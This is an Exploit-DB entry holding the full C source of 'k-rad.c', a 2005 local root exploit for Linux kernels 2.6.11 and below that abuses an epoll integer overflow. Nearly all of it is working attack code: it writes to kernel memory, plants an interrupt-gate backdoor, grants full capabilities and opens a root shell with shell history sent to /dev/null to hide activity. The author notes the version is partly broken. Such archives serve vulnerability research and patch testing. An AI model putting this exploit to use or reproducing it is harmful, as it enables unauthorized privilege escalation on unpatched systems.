/*
EDB Note: Updated exploit can be found here; https://www.exploit-db.com/exploits/25203/

source: https://www.securityfocus.com/bid/12763/info

A Local integer overflow vulnerability affects the Linux kernel. This issue is due to a failure of the affected kernel to properly handle user-supplied size values.

An attacker may leverage this issue to overwrite low kernel memory. This may potentially facilitate privilege escalation.
*/

/*
* k-rad.c - linux 2.6.11 and below CPL 0 kernel exploit v2
* Discovered and exploit coded Jan 2005 by sd <sd@fucksheep.org>
*
* In memory of pwned.c (uselib)
*
* - Redistributions of source code is not permitted.
* - Redistributions in the binary form is not permitted.
* - Redistributions of the above copyright notice, this list of conditions,
* and the following disclaimer is permitted.
* - By proceeding to a Redistribution and under any form of the Program
* the Distributor is granting ownership of his Resources without
* limitations to the copyright holder(s).
*
*
* Since we already owned everyone, theres no point keeping this private
* anymore.
*
* http://seclists.org/lists/fulldisclosure/2005/Mar/0293.html
*
* Thanks to our internet hero georgi guninski for being such incredible
* whitehat disclosing one of the most reliable kernel bugs.
* You saved the world, man, we owe you one!
*
* This version is somewhat broken, but skilled reader will get an idea.
* Well, at least let the scriptkids have fun for a while.
*
* Thanks to all who helped me developing/testing this, you know who you are,
* and especially to my gf for guidance while coding this.
*
*/

#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <linux/capability.h>
#include <asm/unistd.h>
#define __USE_GNU
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <string.h>


#define KRS "\033[1;30m[ \033[1;37m"
#define KRE "\033[1;30m ]\033[0m"
#define KRAD "\033[1;30m[\033[1;37m*\033[1;30m]\033[0m "
#define KRADP "\033[1;30m[\033[1;37m+\033[1;30m]\033[0m "
#define KRADM "\033[1;30m[\033[1;37m-\033[1;30m]\033[0m "

#define MAP (0xfffff000 - (1023*4096))
#define MAP_PAE (0xfffff000 - (511*4096))
#define MKPTE(addr) ((addr & (~4095)) | 0x27)

#define SET_IDT_GATE(idt,ring,s,addr) \
(idt).off1 = addr & 0xffff; \
(idt).off2 = addr >> 16; \
(idt).sel = s; \
(idt).none = 0; \
(idt).flags = 0x8E | (ring << 5); \

struct idtr {
unsigned short limit;
unsigned int base;
} __attribute__ ((packed));

struct idt {
unsigned short off1;
unsigned short sel;
unsigned char none,flags;
unsigned short off2;
} __attribute__ ((packed));

unsigned long long *clear1, *clear2;

#define __syscall_return(type, res) \
do { \
if ((unsigned long)(res) >= (unsigned long)(-125)) { \
errno = -(res); \
res = -1; \
} \
return (type) (res); \
} while (0)

#define _capget_macro(type,name,type1,arg1,type2,arg2) \
type name(type1 arg1,type2 arg2) \
{ \
long __res; \
__asm__ volatile ( "int $0x80" \
: "=a" (__res) \
: "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
__syscall_return(type,__res); \
}

static inline _capget_macro(int,capget,void *,a,void *,b);
void raise_cap(unsigned long *ts)
{
/* must be on lower addresses because of kernel arg check :) */
static struct __user_cap_header_struct head;
static struct __user_cap_data_struct data;
static struct __user_cap_data_struct n;
int i;

*clear1 = 0;
*clear2 = 0;
head.version = 0x19980330;
head.pid = 0;
capget(&head, &data);
/* scan the thread_struct */
for (i = 0; i < 512; i++, ts++) {
/* is it capabilities block? */
if ((ts[0] == data.effective) &&
(ts[1] == data.inheritable) &&
(ts[2] == data.permitted)) {
/* set effective cap to some val */
ts[0] = 0x12341234;
capget(&head, &n);
/* and test if it has changed */
if (n.effective == ts[0]) {
/* if so, we're in :) */
ts[0] = ts[1] = ts[2] = 0xffffffff;
return;
}
/* otherwise fix back the stuff
(if we've not crashed already :) */
ts[0] = data.effective;
}
}
return;
}

extern void stub;
asm (
"stub:;"
" pusha;"
" mov $-8192, %eax;"
" and %esp, %eax;"
" pushl (%eax);"
" call raise_cap;"
" pop %eax;"
" popa;"
" iret;"
);

/* write to kernel from buf, num bytes */
#define DIV 256
#define RES 4
int kwrite(unsigned base, char *buf, int num)
{
int efd, c, i, fd;
int pi[2];
struct epoll_event ev;
int *stab;
unsigned long ptr;
int count;
unsigned magic = 0xffffffff / 12 + 1;

/* initialize epoll */
efd = epoll_create(4096);
if (efd < 0)
return -1;
ev.events = EPOLLIN|EPOLLOUT|EPOLLPRI|EPOLLERR|EPOLLHUP;

/* 12 bytes per fd + one more to be safely in stack space */
count = (num+11)/12+RES;

/* desc array */
stab = alloca((count+DIV-1)/DIV*sizeof(int));
for (i = 0; i < ((count+DIV-1)/DIV)+1; i++) {
if (socketpair(AF_UNIX, SOCK_DGRAM, 0, pi) < 0)
return -1;
send(pi[0], "a", 1, 0);
stab[i] = pi[1];
}
/* highest fd and first descriptor */
fd = pi[1];
/* we've to allocate this separately because we need to have
it's fd preserved - using this we'll be writing actual bytes */
epoll_ctl(efd, EPOLL_CTL_ADD, fd, &ev);
for (i = 0, c = 0; i < (count-1); i++) {
int n;
n = dup2(stab[i/DIV], fd+2+(i % DIV));
if (n < 0)
return -1;
epoll_ctl(efd, EPOLL_CTL_ADD, n, &ev);
close(n);
}
/* in 'n' we've the latest fd we're using to write data */
for (i = 0; i < ((num+7)/8); i++) {
/* data being written from end */
memcpy(&ev.data, buf + num - 8 - i * 8, 8);
epoll_ctl(efd, EPOLL_CTL_MOD, fd, &ev);

/* the actual kernel magic */
ptr = (base + num - (i*8)) - (count * 12);
epoll_wait(efd, (void *) ptr, magic, 31337);
/* don't ask why (rotten rb-trees) :) */
if (i)
epoll_wait(efd, (void *)ptr, magic, 31337);
}

close(efd);
for (i = 3; i <= fd; i++)
close(i);
return 0;
}

/* real-mode interrupt table fixup - point all interrupts to iret.
let's hope this will shut up apm */
void fixint(char *buf)
{
unsigned *tab = (void *) buf;
int i;

for (i = 0; i < 256; i++)
tab[i] = 0x0000400; /* 0000:0400h */
/* iret */
buf[0x400] = 0xcf;
}

/* establish pte pointing to virtual addr 'addr' */
int map_pte(unsigned base, int pagenr, unsigned addr)
{
unsigned *buf = alloca(pagenr * 4096 + 8);
buf[pagenr * 1024] = MKPTE(addr);
buf[pagenr * 1024+1] = 0;
fixint((void *)buf);
return kwrite(base, (void *)buf, pagenr * 4096 + 4);
}

void error(int d)
{
printf(KRADM "y3r 422 12 n07 3r337 3nuPh!\n"
KRAD "Try increase nrpages?\n");
exit(1);
}

int exploit(char *top, int npages, int pae)
{
struct idt *idt;
struct idtr idtr;
unsigned base;
char *argv[] = { "k-rad", NULL };
char *envp[] = { "TERM=linux", "PS1=k-rad\\$", "BASH_HISTORY=/dev/null",
"HISTORY=/dev/null", "history=/dev/null",
"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/
local/bin:/usr/local/sbin", NULL };

signal(SIGSEGV, error);
signal(SIGBUS, error);

/* first compute kernel base */
base = (unsigned long) top;
base += 0x0fffffff;
base &= 0xf0000000;

/* get idt descriptor addr */
asm ("sidt %0" : "=m" (idtr));

/* get the pte in */
map_pte(base, npages, idtr.base - base);

idt = pae?(void *)MAP_PAE:(void *)MAP;

/* cleanup the stuff to prevent others spotting the gate
- must be done from ring 0 */
clear1 = (void *) &idt[0x7f];
clear2 = (void *) (base + npages * 4096);

SET_IDT_GATE(idt[0x7f], 3, idt[0x80].sel, ((unsigned long) &stub));

/* call raise_cap */
asm ("int $0x7f");

printf(KRADP "j00 1u(k7 k1d!\n");
setresuid(0, 0, 0);
setresgid(0, 0, 0);
execve("/bin/sh", argv, envp);
exit(0);
}

int main(int argc, char **argv)
{
char eater[65536];
int npages = 1;

/* unlink(argv[0]); */
// sync();
printf(KRS " k-rad.c - linux 2.6.* CPL 0 kernel exploit " KRE "\n"
KRS "Discovered Jan 2005 by sd <sd@fucksheep.org>" KRE "\n");
if (argc == 2) {
npages = atoi(argv[1]);
if (!npages) {
printf(KRADM "Use: %s [number of pages]\n"
"Increase from 1 to 5, use negative number for pae (from -1 to -5).\n"
"The higher number the more likely it will crash\n", argv[0]);
return 1;
}
printf(KRAD "Overwriting %d pages\n", npages<0?-npages:npages);
}

exploit(eater, npages<0?-npages:npages,npages<0);
return 0;
}